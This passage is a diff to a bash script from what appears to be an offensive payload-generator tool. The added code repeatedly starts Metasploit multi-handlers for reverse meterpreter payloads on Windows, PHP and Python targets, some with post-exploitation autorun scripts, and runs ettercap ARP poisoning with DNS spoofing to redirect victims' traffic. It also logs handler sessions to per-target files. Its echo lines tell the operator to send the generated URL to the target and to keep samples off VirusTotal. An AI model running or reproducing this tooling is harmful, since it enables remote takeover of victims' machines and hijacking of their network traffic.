+         mv final.log $N4m-$lhost.log > /dev/null 2>&1
+         rm report.log > /dev/null 2>&1
+         cd $IPATH/
+       else
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+       fi
+
 
    else
+
 
       # edit files nedded
       cd $IPATH/templates/phishing
@@ -2588,9 +3133,25 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
@@ -2598,8 +3159,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          fi
         fi
    fi
 
@@ -2706,7 +3280,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -2779,7 +3367,22 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
 
@@ -2790,8 +3393,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -2931,7 +3547,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+        fi
       sleep 2
 
 
@@ -3003,9 +3633,25 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "- POST EXPLOIT : $P0"
@@ -3014,8 +3660,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -3065,7 +3724,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+        fi
       sleep 2
 
 
@@ -3138,9 +3811,25 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "- POST EXPLOIT : $P0"
@@ -3149,8 +3838,21 @@ fi
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+          fi
         fi
    fi
 
@@ -3251,7 +3953,22 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
-     xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+       if [ "$MsFlF" = "ON" ]; then
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+         cd $IPATH/output
+         # delete utf-8/non-ancii caracters from output
+         tr -cd '\11\12\15\40-\176' < report.log > final.log
+         sed -i "s/\[0m//g" final.log
+         sed -i "s/\[1m\[34m//g" final.log
+         sed -i "s/\[4m//g" final.log
+         sed -i "s/\[K//g" final.log
+         mv final.log $N4m-$lhost.log > /dev/null 2>&1
+         rm report.log > /dev/null 2>&1
+         cd $IPATH/
+       else
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+       fi
+
 
    else
 
@@ -3347,7 +4064,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
-     xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+       if [ "$MsFlF" = "ON" ]; then
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+         cd $IPATH/output
+         # delete utf-8/non-ancii caracters from output
+         tr -cd '\11\12\15\40-\176' < report.log > final.log
+         sed -i "s/\[0m//g" final.log
+         sed -i "s/\[1m\[34m//g" final.log
+         sed -i "s/\[4m//g" final.log
+         sed -i "s/\[K//g" final.log
+         mv final.log $N4m-$lhost.log > /dev/null 2>&1
+         rm report.log > /dev/null 2>&1
+         cd $IPATH/
+       else
+         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+       fi
 
 
    else
@@ -3473,9 +4204,25 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
@@ -3483,8 +4230,21 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
+          fi
         fi
 
 
@@ -3600,7 +4360,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
       echo "[☠] Start a multi-handler..."
       echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
       echo "[☯] Please dont test samples on virus total..."
-xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+        if [ "$MsFlF" = "ON" ]; then
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+          cd $IPATH/output
+          # delete utf-8/non-ancii caracters from output
+          tr -cd '\11\12\15\40-\176' < report.log > final.log
+          sed -i "s/\[0m//g" final.log
+          sed -i "s/\[1m\[34m//g" final.log
+          sed -i "s/\[4m//g" final.log
+          sed -i "s/\[K//g" final.log
+          mv final.log $N4m-$lhost.log > /dev/null 2>&1
+          rm report.log > /dev/null 2>&1
+          cd $IPATH/
+        else
+          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+        fi
       sleep 2
 
    else
@@ -3627,9 +4401,25 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+          fi
+
 
         else
+
 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
@@ -3637,8 +4427,21 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "[☠] Start a multi-handler..."
         echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
         echo "[☯] Please dont test samples on virus total..."
-        xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
-
+          if [ "$MsFlF" = "ON" ]; then
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+            cd $IPATH/output
+            # delete utf-8/non-ancii caracters from output
+            tr -cd '\11\12\15\40-\176' < report.log > final.log
+            sed -i "s/\[0m//g" final.log
+            sed -i "s/\[1m\[34m//g" final.log
+            sed -i "s/\[4m//g" final.log
+            sed -i "s/\[K//g" final.log
+            mv final.log $N4m-$lhost.log > /dev/null 2>&1
+            rm report.log > /dev/null 2>&1
+            cd $IPATH/
+          else
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'"
+          fi
         fi
    fi
 
@@ -3712,9 +4515,25 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
      echo "[☠] Start a multi-handler..."
